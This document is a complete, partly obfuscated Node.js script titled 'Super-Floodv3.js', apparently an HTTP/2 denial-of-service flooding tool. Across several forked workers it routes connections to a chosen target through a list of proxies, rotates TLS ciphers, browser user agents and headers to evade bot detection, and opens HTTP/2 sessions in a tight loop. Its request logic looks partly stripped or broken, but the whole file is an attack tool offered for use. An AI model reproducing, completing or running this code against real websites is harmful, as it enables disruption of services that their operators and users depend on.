const net = require("net"),
      http2 = require("http2"),
      tls = require("tls"),
      cluster = require("cluster"),
      url = require("url"),
      fs = require("fs");

const {
  HeaderGenerator
} = require("header-generator");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x23c5ef) {});
process.argv.length < 7 && (console.log("Usage: node Super-Floodv3.js target time rate thread proxyfile"), process.exit());
const headers = {};

function readLines(_0x308435) {
  return fs.readFileSync(_0x308435, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(_0x3ed185, _0x1f10a5) {
  return Math.floor(Math.random() * (_0x1f10a5 - _0x3ed185) + _0x3ed185);
}

function randomElement(_0x262c52) {
  return _0x262c52[randomIntn(0, _0x262c52.length)];
}

function randstr(_0x54711e) {
  var _0x3c77f2 = "",
      _0x14c4fd = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
      _0x3c3112 = _0x14c4fd.length;

  for (var _0x54fbcf = 0; _0x54fbcf < _0x54711e; _0x54fbcf++) {
    _0x3c77f2 += _0x14c4fd.charAt(Math.floor(Math.random() * _0x3c3112));
  }

  return _0x3c77f2;
}

const _0x3641a6 = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
};
const _0x3af50b = {
  name: "chrome",
  minVersion: 80,
  maxVersion: 107,
  httpVersion: "2"
};
const sig = ["rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"],
      cplist = ["TLS_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_CHACHA20_POLY1305_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_AES_128_CCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_AES_128_CCM_8_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM"],
      accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"],
      lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"],
      encoding_header = ["deflate, gzip, br", "gzip", "deflate", "br"];
const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 OPR/96.0.0.0", "Mozilla/5.0 (Windows NT 10.0; rv:112.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.34", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.0.2246 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; rv:102.0) Gecko/20100101 Goanna/6.0 Firefox/102.0 PaleMoon/32.0.0", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15", "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
    siga = sig[Math.floor(Math.floor(Math.random() * sig.length))],
    uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))],
    lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))],
    encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))],
    proxies = readLines(_0x3641a6.proxyFile);
const parsedTarget = url.parse(_0x3641a6.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= _0x3641a6.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}

class NetSocket {
  constructor() {}

  HTTP(_0x545d27, _0x3b6df8) {
    const _0x2c2b4b = "CONNECT " + _0x545d27.address + ":443 HTTP/1.1\r\nHost: " + _0x545d27.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
          _0x4825c1 = new Buffer.from(_0x2c2b4b),
          _0x488b86 = {
      host: _0x545d27.host,
      port: _0x545d27.port
    };

    const _0x1da2c8 = net.connect(_0x488b86);

    _0x1da2c8.setTimeout(_0x545d27.timeout * 100000);

    _0x1da2c8.setKeepAlive(true, 100000);

    _0x1da2c8.on("connect", () => {
      _0x1da2c8.write(_0x4825c1);
    });

    _0x1da2c8.on("data", _0x59b371 => {
      const _0x581f2a = _0x59b371.toString("utf-8"),
            _0x199f82 = _0x581f2a.includes("HTTP/1.1 200");

      if (_0x199f82 === false) {
        _0x1da2c8.destroy();

        return _0x3b6df8(undefined, "error: invalid response from proxy server");
      }

      return _0x3b6df8(_0x1da2c8, undefined);
    });

    _0x1da2c8.on("timeout", () => {
      _0x1da2c8.destroy();

      return _0x3b6df8(undefined, "error: timeout exceeded");
    });

    _0x1da2c8.on("error", _0x3f1b0e => {
      _0x1da2c8.destroy();

      return _0x3b6df8(undefined, "error: " + _0x3f1b0e);
    });
  }

}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(100);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers.accept = accept;
headers["accept-encoding"] = encoding;
headers["accept-language"] = lang;
headers["cache-control"] = randomElement(["private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0"]);
headers.pragma = "no-cache";
headers.referer = parsedTarget.protocol + "//" + parsedTarget.host;
headers["sec-ch-ua"] = "\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"";
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers.TE = "trailers";
headers.Trailer = "Max-Forwards";
headers["upgrade-insecure-requests"] = "1";
headers["user-agent"] = uap1;
headers.cookie = randstr(200);

function runFlooder() {
  const _0x22a812 = randomElement(proxies);

  const _0x5c35a0 = _0x22a812.split(":");

  const _0xb53abd = {
    host: _0x5c35a0[0],
    port: ~~_0x5c35a0[1],
    address: parsedTarget.host + ":443",
    timeout: 5
  };
  Socker.HTTP(_0xb53abd, (_0x854a20, _0x145a65) => {
    if (_0x145a65) {
      return;
    }

    _0x854a20.setKeepAlive(true, 600000);

    const _0x363dbe = {
      ecdhCurve: "prime256v1:X25519",
      ciphers: tls.getCiphers().join(":") + cipper,
      secureProtocol: ["TLSv1_2_method", "TLSv1_3_method"],
      sigals: siga,
      servername: parsedTarget.host,
      compression: true,
      servername: parsedTarget.host,
      secure: true,
      rejectUnauthorized: false,
      ALPNProtocols: ["http/1.1", "h2"],
      socket: _0x854a20
    },
          _0x4b22f7 = tls.connect(443, parsedTarget.host, _0x363dbe);

    _0x4b22f7.setKeepAlive(true, 100000);

    const _0xc89e8d = {
      headerTableSize: 65536,
      maxConcurrentStreams: 500000,
      initialWindowSize: 65535,
      maxHeaderListSize: 524288,
      enablePush: false
    };
    const _0x1fed60 = {
      protocol: "https:",
      settings: _0xc89e8d,
      maxSessionMemory: 256000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x4b22f7,
      socket: _0x854a20
    };

    const _0x5cf84f = http2.connect(parsedTarget.href, _0x1fed60),
          _0x13d959 = {
      headerTableSize: 65536,
      maxConcurrentStreams: 500000,
      initialWindowSize: 65535,
      maxHeaderListSize: 524288,
      enablePush: false
    };

    _0x5cf84f.settings(_0x13d959);

    _0x5cf84f.setMaxListeners(0);

    _0x5cf84f.on("connect", () => {});

    _0x5cf84f.on("close", () => {
      _0x5cf84f.destroy();

      _0x854a20.destroy();

      return;
    });

    _0x5cf84f.on("error", _0x2030c5 => {
      _0x5cf84f.destroy();

      _0x854a20.destroy();

      return;
    });
  });

  (function (_0x2a486f, _0x9a95c7, _0x1a9d50) {});
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, _0x3641a6.time * 1000);